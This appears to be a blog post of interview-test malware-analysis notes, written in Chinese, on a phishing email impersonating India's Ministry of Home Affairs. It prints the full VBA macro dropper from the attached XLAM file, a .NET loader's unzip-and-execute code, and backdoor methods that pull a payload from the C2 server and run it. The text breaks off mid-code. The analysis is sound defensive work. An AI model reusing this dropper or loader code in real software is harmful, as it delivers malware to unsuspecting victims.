<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="
  TeamT5筆試題目筆記
  #

:::info
前言: 通常我自己拿到一隻樣本，起手式會先搜一下hash，VirusTotal如果有紀錄的話最好，再來會丟到AnyRun看一下動態sandbox的狀態為何，但不確定這樣的操作是否符合本次筆試的預期，所以我會先設法在本機VM內分析看看，如果有利用這幾個online tools而得知的資訊，會再行標註
:::
:::danger
經過二階面試後，用線上的工具例如VirusTotal和AnyRun都是被嚴格禁止的。
第一個樣本總花費時間: 2天/第二個樣本總花費時間: 4天
:::

  樣本(93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a)
  #


  惡意程式
  #


  檔案資訊
  #



DIE(Detect It Easy)

看起來是一個HTML的純文字檔案


File/Stat/Exiftool
從以下結果來看，是一個SMTP的郵件檔案，並且是純文字的形式，所以直覺上可能和Outlook或是Firefox Thunderbird有關係，以binwalk的結果來說，他應該有壓縮一些內容在其中，如果實際丟到Any.Run的話會發現的確有很多檔案被compressed

或者是說，從檔案內容來看(HxD)，會發現data帶了一個base64的file，decode會發現是0x50 4B 03 04
:::spoiler Command Result
$ file 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a
93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a: SMTP mail, ASCII text, with CRLF line terminators
$ exiftool 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a
ExifTool Version Number         : 12.40
File Name                       : 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a
Directory                       : .
File Size                       : 180 KiB
File Modification Date/Time     : 2023:08:14 11:54:39+08:00
File Access Date/Time           : 2024:02:29 16:55:48+08:00
File Inode Change Date/Time     : 2024:02:29 16:55:48+08:00
File Permissions                : -rwxrwxrwx
File Type                       : TXT
File Type Extension             : txt
MIME Type                       : text/plain
MIME Encoding                   : us-ascii
Newlines                        : Windows CRLF
Line Count                      : 2410
Word Count                      : 2741
$ stat 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a
  File: 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a
  Size: 184712          Blocks: 368        IO Block: 4096   regular file
Device: 66h/102d        Inode: 1688849860790082  Links: 1
Access: (0777/-rwxrwxrwx)  Uid: ( 1000/ sbk6401)   Gid: ( 1000/ sbk6401)
Access: 2024-02-29 16:55:48.949690200 +0800
Modify: 2023-08-14 11:54:39.000000000 +0800
Change: 2024-02-29 16:55:48.949690200 +0800
 Birth: -
$ binwalk 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
4244          0x1094          HTML document header
5554          0x15B2          HTML document footer
73264         0x11E30         StuffIt Deluxe Segment (data): fWm1
169908        0x297B4         IMG0 (VxWorks) header, size: 218780743
:::"><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/job/interview/teamt5%E7%AD%86%E8%A9%A6%E9%A1%8C%E7%9B%AE%E7%AD%86%E8%A8%98/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="TeamT5筆試題目筆記"><meta property="og:description" content="TeamT5筆試題目筆記 # :::info 前言: 通常我自己拿到一隻樣本，起手式會先搜一下hash，VirusTotal如果有紀錄的話最好，再來會丟到AnyRun看一下動態sandbox的狀態為何，但不確定這樣的操作是否符合本次筆試的預期，所以我會先設法在本機VM內分析看看，如果有利用這幾個online tools而得知的資訊，會再行標註 ::: :::danger 經過二階面試後，用線上的工具例如VirusTotal和AnyRun都是被嚴格禁止的。 第一個樣本總花費時間: 2天/第二個樣本總花費時間: 4天 :::
樣本(93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a) # 惡意程式 # 檔案資訊 # DIE(Detect It Easy) 看起來是一個HTML的純文字檔案
File/Stat/Exiftool 從以下結果來看，是一個SMTP的郵件檔案，並且是純文字的形式，所以直覺上可能和Outlook或是Firefox Thunderbird有關係，以binwalk的結果來說，他應該有壓縮一些內容在其中，如果實際丟到Any.Run的話會發現的確有很多檔案被compressed 或者是說，從檔案內容來看(HxD)，會發現data帶了一個base64的file，decode會發現是0x50 4B 03 04 :::spoiler Command Result
$ file 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a: SMTP mail, ASCII text, with CRLF line terminators $ exiftool 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a ExifTool Version Number : 12.40 File Name : 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a Directory : . File Size : 180 KiB File Modification Date/Time : 2023:08:14 11:54:39+08:00 File Access Date/Time : 2024:02:29 16:55:48+08:00 File Inode Change Date/Time : 2024:02:29 16:55:48+08:00 File Permissions : -rwxrwxrwx File Type : TXT File Type Extension : txt MIME Type : text/plain MIME Encoding : us-ascii Newlines : Windows CRLF Line Count : 2410 Word Count : 2741 $ stat 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a File: 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a Size: 184712 Blocks: 368 IO Block: 4096 regular file Device: 66h/102d Inode: 1688849860790082 Links: 1 Access: (0777/-rwxrwxrwx) Uid: ( 1000/ sbk6401) Gid: ( 1000/ sbk6401) Access: 2024-02-29 16:55:48.949690200 +0800 Modify: 2023-08-14 11:54:39.000000000 +0800 Change: 2024-02-29 16:55:48.949690200 +0800 Birth: - $ binwalk 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 4244 0x1094 HTML document header 5554 0x15B2 HTML document footer 73264 0x11E30 StuffIt Deluxe Segment (data): fWm1 169908 0x297B4 IMG0 (VxWorks) header, size: 218780743 :::"><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="job"><meta property="article:tag" content="Interview"><title>TeamT5筆試題目筆記 | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/job/interview/teamt5%E7%AD%86%E8%A9%A6%E9%A1%8C%E7%9B%AE%E7%AD%86%E8%A8%98/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>TeamT5筆試題目筆記</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#惡意程式>惡意程式</a><ul><li><a href=#檔案資訊>檔案資訊</a></li><li><a href=#執行流程>執行流程</a></li><li><a href=#通訊協定>通訊協定</a></li><li><a href=#加解密演算法>加解密演算法</a></li><li><a href=#後門功能>後門功能</a></li><li><a href=#常駐方式>常駐方式</a></li></ul></li><li><a href=#中繼站>中繼站</a><ul><li><a href=#基本資訊>基本資訊</a></li><li><a href=#關連資訊>關連資訊</a></li></ul></li><li><a href=#威脅情資>威脅情資</a><ul><li><a href=#攻擊者>攻擊者</a></li><li><a href=#攻擊時間>攻擊時間</a></li><li><a href=#受害者>受害者</a></li></ul></li></ul><ul><li><a href=#惡意程式-1>惡意程式</a><ul><li><a href=#檔案資訊-1>檔案資訊</a></li><li><a href=#執行流程-1>執行流程</a></li><li><a href=#通訊協定-1>通訊協定</a></li><li><a href=#加解密演算法-1>加解密演算法</a></li><li><a href=#後門功能-1>後門功能</a></li><li><a href=#常駐方式-1>常駐方式</a></li></ul></li><li><a href=#中繼站-1>中繼站</a><ul><li><a href=#基本資訊-1>基本資訊</a></li><li><a href=#關連資訊-1>關連資訊</a></li></ul></li><li><a href=#威脅情資-1>威脅情資</a><ul><li><a href=#攻擊者-1>攻擊者</a></li><li><a href=#攻擊時間-1>攻擊時間</a></li><li><a href=#受害者-1>受害者</a></li></ul></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=teamt5筆試題目筆記>TeamT5筆試題目筆記
<a class=anchor href=#teamt5%e7%ad%86%e8%a9%a6%e9%a1%8c%e7%9b%ae%e7%ad%86%e8%a8%98>#</a></h1><p>:::info
前言: 通常我自己拿到一隻樣本，起手式會先搜一下hash，VirusTotal如果有紀錄的話最好，再來會丟到AnyRun看一下動態sandbox的狀態為何，但不確定這樣的操作是否符合本次筆試的預期，所以我會先設法在本機VM內分析看看，如果有利用這幾個online tools而得知的資訊，會再行標註
:::
:::danger
經過二階面試後，用線上的工具例如VirusTotal和AnyRun都是被嚴格禁止的。
第一個樣本總花費時間: 2天/第二個樣本總花費時間: 4天
:::</p><h1 id=樣本93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a>樣本(93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a)
<a class=anchor href=#%e6%a8%a3%e6%9c%ac93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a>#</a></h1><h2 id=惡意程式>惡意程式
<a class=anchor href=#%e6%83%a1%e6%84%8f%e7%a8%8b%e5%bc%8f>#</a></h2><h3 id=檔案資訊>檔案資訊
<a class=anchor href=#%e6%aa%94%e6%a1%88%e8%b3%87%e8%a8%8a>#</a></h3><ol><li><p>DIE(Detect It Easy)
<img src=https://hackmd.io/_uploads/S1Lbp6T3p.png alt=圖片>
看起來是一個HTML的純文字檔案</p></li><li><p>File/Stat/Exiftool
從以下結果來看，是一個SMTP的郵件檔案，並且是純文字的形式，所以直覺上可能和Outlook或是Firefox Thunderbird有關係，以binwalk的結果來說，他應該有壓縮一些內容在其中，如果實際丟到Any.Run的話會發現的確有很多檔案被compressed
<img src=https://hackmd.io/_uploads/rJfrgyR3a.png alt=圖片></p><p>或者是說，從檔案內容來看(HxD)，會發現data帶了一個base64的file，decode會發現是<code>0x50 4B 03 04</code>
:::spoiler Command Result</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ file 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a
</span></span><span style=display:flex><span>93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a: SMTP mail, ASCII text, with CRLF line terminators
</span></span><span style=display:flex><span>$ exiftool 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a
</span></span><span style=display:flex><span>ExifTool Version Number         : 12.40
</span></span><span style=display:flex><span>File Name                       : 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a
</span></span><span style=display:flex><span>Directory                       : .
</span></span><span style=display:flex><span>File Size                       : <span style=color:#ae81ff>180</span> KiB
</span></span><span style=display:flex><span>File Modification Date/Time     : 2023:08:14 11:54:39+08:00
</span></span><span style=display:flex><span>File Access Date/Time           : 2024:02:29 16:55:48+08:00
</span></span><span style=display:flex><span>File Inode Change Date/Time     : 2024:02:29 16:55:48+08:00
</span></span><span style=display:flex><span>File Permissions                : -rwxrwxrwx
</span></span><span style=display:flex><span>File Type                       : TXT
</span></span><span style=display:flex><span>File Type Extension             : txt
</span></span><span style=display:flex><span>MIME Type                       : text/plain
</span></span><span style=display:flex><span>MIME Encoding                   : us-ascii
</span></span><span style=display:flex><span>Newlines                        : Windows CRLF
</span></span><span style=display:flex><span>Line Count                      : <span style=color:#ae81ff>2410</span>
</span></span><span style=display:flex><span>Word Count                      : <span style=color:#ae81ff>2741</span>
</span></span><span style=display:flex><span>$ stat 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a
</span></span><span style=display:flex><span>  File: 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a
</span></span><span style=display:flex><span>  Size: <span style=color:#ae81ff>184712</span>          Blocks: <span style=color:#ae81ff>368</span>        IO Block: <span style=color:#ae81ff>4096</span>   regular file
</span></span><span style=display:flex><span>Device: 66h/102d        Inode: <span style=color:#ae81ff>1688849860790082</span>  Links: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Access: <span style=color:#f92672>(</span>0777/-rwxrwxrwx<span style=color:#f92672>)</span>  Uid: <span style=color:#f92672>(</span> 1000/ sbk6401<span style=color:#f92672>)</span>   Gid: <span style=color:#f92672>(</span> 1000/ sbk6401<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Access: 2024-02-29 16:55:48.949690200 +0800
</span></span><span style=display:flex><span>Modify: 2023-08-14 11:54:39.000000000 +0800
</span></span><span style=display:flex><span>Change: 2024-02-29 16:55:48.949690200 +0800
</span></span><span style=display:flex><span> Birth: -
</span></span><span style=display:flex><span>$ binwalk 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>DECIMAL       HEXADECIMAL     DESCRIPTION
</span></span><span style=display:flex><span>--------------------------------------------------------------------------------
</span></span><span style=display:flex><span><span style=color:#ae81ff>4244</span>          0x1094          HTML document header
</span></span><span style=display:flex><span><span style=color:#ae81ff>5554</span>          0x15B2          HTML document footer
</span></span><span style=display:flex><span><span style=color:#ae81ff>73264</span>         0x11E30         StuffIt Deluxe Segment <span style=color:#f92672>(</span>data<span style=color:#f92672>)</span>: fWm1
</span></span><span style=display:flex><span><span style=color:#ae81ff>169908</span>        0x297B4         IMG0 <span style=color:#f92672>(</span>VxWorks<span style=color:#f92672>)</span> header, size: <span style=color:#ae81ff>218780743</span>
</span></span></code></pre></div><p>:::</p></li></ol><h3 id=執行流程>執行流程
<a class=anchor href=#%e5%9f%b7%e8%a1%8c%e6%b5%81%e7%a8%8b>#</a></h3><ol><li>因為這是一個SMTP的檔案，所以先用VM的mail看一下裡面的資訊，沒意外的話根據上面的敘述，這應該是一個phishing email，並且把內文偽裝成印度的MHA政府部門(Ministry of Home Affairs, 內政部)
<img src=https://hackmd.io/_uploads/BkY1yBRna.png alt=圖片></li><li>所以重點應該就是在信件中夾帶的檔案，也就是==Guidelines.xlam==，這也是一個沒有看過的extension，所以根據<sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup>的說明，看起來這個檔案可以使用巨集，看到Macro這個關鍵字直覺上就感覺不太對勁，因為看過的實際案例就蠻常出現利用Macro夾帶一些script或是惡意的command<blockquote><p>XLAM file extension may refer to a file used by a spreadsheet program called Microsoft Excel. This program enables users to create and edit spreadsheets. These files also contain a macro-enabled add-in that provides extra tools and functionality that may execute macros. XLAM files may also be used for extension of Excel provided modules.</p></blockquote></li><li>由於VM內沒有可以Excel，所以容許我用Any.Run Sandbox看一下中間執行的過程，首先針對前三個process，有很大的問題
<img src=https://hackmd.io/_uploads/HkXNuwZT6.png alt=圖片><ol><li><p>Unusual execution from MS Office</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\a</span>dmin<span style=color:#ae81ff>\G</span>lhvadia<span style=color:#ae81ff>\h</span>braeiwas.exe
</span></span></code></pre></div><p>不是很清楚這一個command line是怎麼來的，後來發現有一個VB script，從Any.Run中看不太出來他是怎麼執行的，所幸就直接在VM中安裝office來跟一下
<img src=https://hackmd.io/_uploads/rylQFw-6a.png alt=圖片></p><p>其實一開始執行==Guidelines.xlam==時會詢問要不要啟動Macro，也就是這個時候如果啟動就會執行惡意的file→<code>"C:\Users\admin\Glhvadia\hbraeiwas.exe", vbNormalNoFocus</code></p></li><li><p>Analyze VBA
一開始也不知道怎麼在Excel中看VBA code，也是根據<sup id=fnref:2><a href=#fn:2 class=footnote-ref role=doc-noteref>2</a></sup><sup id=fnref:3><a href=#fn:3 class=footnote-ref role=doc-noteref>3</a></sup>才知道，另外，由於是第一次碰到關於VBA的問題，所以有關於要從哪一個Module開始看也不是很清楚，不過還好他只有兩個Module，雖然我看不是很確定VBA的流程，但根據AI的解析可以略知一二
<img src=https://hackmd.io/_uploads/HJa3-Kb6T.png alt=圖片></p><pre tabindex=0><code class="language-vb=" data-lang="vb=">Sub userothraLoadr()
    Dim path_othra_file As String
    Dim file_othra_name  As String
    Dim fldr_othra_name  As Variant
    Dim byt() As Byte
    Dim ar1othra() As String


    file_othra_name = &#34;hbraeiwas&#34;
    fldr_othra_name = Environ$(&#34;USERPROFILE&#34;) &amp; &#34;\Glhvadia\&#34;

    If Dir(fldr_othra_name, vbDirectory) = &#34;&#34; Then
        MkDir (fldr_othra_name)
    End If
    path_othra_file = fldr_othra_name &amp; file_othra_name &amp; &#34;.e&#34;
    If InStr(Application.OperatingSystem, &#34;6.02&#34;) &gt; 0 Or InStr(Application.OperatingSystem, &#34;6.03&#34;) &gt; 0 Then
        ar1othra = Split(UserForm1.TextBox2.Text, &#34;i&#34;)
    Else
        ar1othra = Split(UserForm1.TextBox1.Text, &#34;i&#34;)
    End If
    Dim btsothra() As Byte
    Dim linothra As Double
    linothra = 0
    For Each vl In ar1othra
        ReDim Preserve btsothra(linothra)
        btsothra(linothra) = CByte(vl)
        linothra = linothra + 1
    Next
    Open path_othra_file &amp; &#34;xe&#34; For Binary Access Write As #3
         Put #3, , btsothra
    Close #3
     Shell path_othra_file &amp; &#34;xe&#34;, vbNormalNoFocus
End Sub
</code></pre><p>這個script簡單來說就是在做malware payload的extract，原本作者把惡意的payload scramble之後，當victim同意啟動Macro，他會再unscramble，可以看到下圖，他會依照不同的Application Version，選擇要用哪一個scramble payload接著把這些bits轉成bytes後寫到某一個檔案中，並且用shell執行該檔案，以上這些操作都極其詭異，另外他把檔案寫在</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-vb data-lang=vb><span style=display:flex><span>Environ<span style=color:#960050;background-color:#1e0010>$</span>(<span style=color:#e6db74>&#34;USERPROFILE&#34;</span>) <span style=color:#f92672>&amp;</span> <span style=color:#e6db74>&#34;\Glhvadia\hbraeiwas&#34;</span>
</span></span></code></pre></div><p>:::danger
這一段是錯的，他看的版本是OS的版本號，來決定要用哪一隻Payload，因為這和後面.NET的版很也有關係
:::
<img src=https://hackmd.io/_uploads/r1H_RTzp6.png alt=image>
實際去看也的確是在這邊
<img src=https://hackmd.io/_uploads/H1RAlCza6.png alt=image></p></li><li><p>Anaylize hbraeiwas.exe
根據DIE的解析，這是一個用.NET寫的script，我之前碰到.NET的例子不多，唯一有碰過的reverse經驗是來自<a href=https://hackmd.io/@SBK6401/HkIYEw8Kh>臺大計安的welcome題-Nine & Nine-Revenge</a>
<img src=https://hackmd.io/_uploads/HkBm8RfTT.png alt=image>
一開始並不知道要先看哪裡，所以看了一些<code>.NET</code> reversing的文章，發現可以先從自定義的module開始看，也就是<code>hbraeiwas</code>這個class，如下圖
<img src=https://hackmd.io/_uploads/H1M0HJQpp.png alt=image>
透過copilot的解析可以很方便的看出這個程式的主要功能是解壓縮一個 ZIP 檔案並啟動其中包含的應用程式。這種行為常見於一些惡意軟體中，因為它可以用於自解壓縮並執行惡意程式碼，如果直接用動態debugger，就會更清楚他把東西unzip到哪邊去，他是decompress到<code>C:\ProgramData\Hdlharas\dlrarhsiva.exe</code>，並且實際執行
<img src=https://hackmd.io/_uploads/HkWmWeXTa.png alt=image>
再詳細說明一下，他先instantiate Class1，並且把裡面的內容丟到<code>dlrarhsiva.exe</code>，再執行，所以如果不想要分析其他有的沒得東西，可以直接看<code>Resources\dlrarhsiva7</code>這個執行檔
<img src=https://hackmd.io/_uploads/HyMWUxmaa.png alt=image>
:::spoiler</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> UnZip()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>string</span> apppath = <span style=color:#66d9ef>this</span>.get_apppath();
</span></span><span style=display:flex><span>        Class1 @class = <span style=color:#66d9ef>new</span> Class1();
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>byte</span>[] wind = @class.getWind();
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>bool</span> flag = !Directory.Exists(apppath);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (flag)
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            Directory.CreateDirectory(apppath);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>string</span> text = apppath + <span style=color:#66d9ef>this</span>.appName;
</span></span><span style=display:flex><span>        File.WriteAllBytes(text, wind);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>string</span> text2 = apppath + <span style=color:#e6db74>&#34;mdkhm.zip&#34;</span>;
</span></span><span style=display:flex><span>        flag = !File.Exists(text2);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (flag)
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            File.Move(text, text2);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>string</span> text3 = text + <span style=color:#e6db74>&#34;.exe&#34;</span>.ToString();
</span></span><span style=display:flex><span>        flag = !File.Exists(text3);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (flag)
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>object</span> objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(<span style=color:#66d9ef>this</span>.shObj, <span style=color:#66d9ef>null</span>, <span style=color:#e6db74>&#34;NameSpace&#34;</span>, <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>object</span>[]
</span></span><span style=display:flex><span>            {
</span></span><span style=display:flex><span>                apppath
</span></span><span style=display:flex><span>            }, <span style=color:#66d9ef>null</span>, <span style=color:#66d9ef>null</span>, <span style=color:#66d9ef>null</span>));
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>object</span> objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(<span style=color:#66d9ef>this</span>.shObj, <span style=color:#66d9ef>null</span>, <span style=color:#e6db74>&#34;NameSpace&#34;</span>, <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>object</span>[]
</span></span><span style=display:flex><span>            {
</span></span><span style=display:flex><span>                text2
</span></span><span style=display:flex><span>            }, <span style=color:#66d9ef>null</span>, <span style=color:#66d9ef>null</span>, <span style=color:#66d9ef>null</span>));
</span></span><span style=display:flex><span>            NewLateBinding.LateCall(objectValue, <span style=color:#66d9ef>null</span>, <span style=color:#e6db74>&#34;CopyHere&#34;</span>, <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>object</span>[]
</span></span><span style=display:flex><span>            {
</span></span><span style=display:flex><span>                RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue2, <span style=color:#66d9ef>null</span>, <span style=color:#e6db74>&#34;Items&#34;</span>, <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>object</span>[<span style=color:#ae81ff>0</span>], <span style=color:#66d9ef>null</span>, <span style=color:#66d9ef>null</span>, <span style=color:#66d9ef>null</span>)),
</span></span><span style=display:flex><span>                <span style=color:#ae81ff>4</span>
</span></span><span style=display:flex><span>            }, <span style=color:#66d9ef>null</span>, <span style=color:#66d9ef>null</span>, <span style=color:#66d9ef>null</span>, <span style=color:#66d9ef>true</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        Process.Start(text3);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>catch</span> (Exception ex)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>:::</p></li><li><p>Anaylize dlrarhsiva.exe
根據DIE發現這也是一個.NET寫的PE file
<img src=https://hackmd.io/_uploads/S1mWzgXpa.png alt=image>
而且會發現module多了很多，實際進去看會發現應該是實際與C2 server連線和實作指令的地方，也就是後門的指令都在這邊
<img src=https://hackmd.io/_uploads/BJ1jV-mTT.png alt=image>
至於有哪一些操作，詳細可以看後門功能的section</p></li></ol></li></ol><h3 id=通訊協定>通訊協定
<a class=anchor href=#%e9%80%9a%e8%a8%8a%e5%8d%94%e5%ae%9a>#</a></h3><p>我是直接把any.run的pcap download下來看有哪些東西</p><pre tabindex=0><code>NBNS
ARP
ICMPv6
LLMNR
BROWSER
DNS
TCP
DHCPv6
MDNS
STP
</code></pre><p>其實最主要C2 server和victim的連線主要是TCP，不過因為C2 server貌似沒有在運作了，所以沒辦法連線，我只能大概用連線失敗的封包以及後門的code判斷，至由有沒有其他的連線方式就不是很確定
<img src=https://hackmd.io/_uploads/HJlaEEQTa.png alt=image></p><h3 id=加解密演算法>加解密演算法
<a class=anchor href=#%e5%8a%a0%e8%a7%a3%e5%af%86%e6%bc%94%e7%ae%97%e6%b3%95>#</a></h3><p>就我本身的理解，看不太出來哪邊有特別做到加解密的事情，每一個步驟幾乎都只是一般的unscramble或是decompress可以解釋的地方</p><h3 id=後門功能>後門功能
<a class=anchor href=#%e5%be%8c%e9%96%80%e5%8a%9f%e8%83%bd>#</a></h3><ol><li><p>Screenshot→
<code>dlrarhsiva/dlrarhsiva.cxc/dlrarhsiva/SLCLRNS/dlrarhsivascreen</code>
<img src=https://hackmd.io/_uploads/HyBqS-XTp.png alt=image></p></li><li><p>Remove User→<code>dlrarhsiva/dlrarhsiva.cxc/dlrarhsiva/OLRDMR/dlrarhsivaremove_user</code>
這一段我認為是想辦法把一些資料pull下來後，並且直接執行remove user的動作，所以實際跟進去==dlrarhsivapull_data==這個method，會發現的確如我所預測，只不過實作的方法是他先從server那一端看有多少的bytes需要pull，然後把該值轉成int後就直接pull資料
:::spoiler dlrarhsivapull_data() Source Code</p><pre tabindex=0><code class=language-csharp! data-lang=csharp!>// dlrarhsiva.OLRDMR
// Token: 0x06000036 RID: 54 RVA: 0x0000480C File Offset: 0x00002A0C
public void dlrarhsivaremove_user()
{
    try
    {
        byte[] array = this.server.dlrarhsivapull_data();
        if (array != null)
        {
            if (!File.Exists(DLAONIF.dlrarhsivaget_mpath() + DLAONIF.dlrarhsivaremvUser + &#34;.exe&#34;))
            {
                File.WriteAllBytes(DLAONIF.dlrarhsivaget_mpath() + DLAONIF.dlrarhsivaremvUser + &#34;.exe&#34;, array);
                this.dlrarhsivado_process(DLAONIF.dlrarhsivaget_mpath() + DLAONIF.dlrarhsivaremvUser + &#34;.exe&#34;);
            }
        }
    }
    catch
    {
    }
}
</code></pre><p>:::</p></li><li><p>Fetch Victim&rsquo;s Info→<code>dlrarhsiva/dlrarhsiva.cxc/dlrarhsiva/MLRLEINF/dlrarhsivaInfo</code>
從以下source code可以知道使用Info這個command可以得知victim的Username或是MachineName
:::spoiler dlrarhsivaInfo() Source Code</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp><span style=display:flex><span><span style=color:#75715e>// dlrarhsiva.MLRLEINF</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// Token: 0x06000031 RID: 49 RVA: 0x0000472C File Offset: 0x0000292C</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> dlrarhsivaInfo()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>this</span>.dlrarhsivaapver = <span style=color:#e6db74>&#34;M.0.0.5|dlrarhsiva&#34;</span>.Split(<span style=color:#66d9ef>new</span> <span style=color:#66d9ef>char</span>[]
</span></span><span style=display:flex><span>    {
